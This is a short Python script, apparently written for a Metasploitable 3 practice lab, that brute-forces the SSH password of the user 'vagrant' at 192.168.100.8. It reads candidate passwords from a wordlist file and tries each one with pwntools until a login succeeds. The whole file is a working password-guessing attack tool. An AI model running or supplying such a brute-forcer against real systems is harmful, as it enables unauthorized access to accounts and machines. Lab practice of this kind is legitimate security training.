from pwn import *
import paramiko

#target is Metasploitable 3 on 192.168.100.8
#creds for target is vagrant:vagrant
#info on docs for this library for ssh function: https://docs.pwntools.com/en/stable/tubes/ssh.html

host = "192.168.100.8"
username = "vagrant"
attempts = 0

with open("passwords.txt", "r") as password_list:
    for password in password_list:
        password = password.strip("\n")
        try:
            print("[{}] Trying password: '{}'!".format(attempts, password))
            response = ssh(host=host, user=username, password=password, timeout=2)
            if response.connected():
                print("[>] Password for user '{}' found: '{}'".format(username, password))
                response.close()
                break
            response.close()
        except paramiko.ssh_exception.AuthenticationException:
            print("[X] Invalid password!")
        attempts += 1
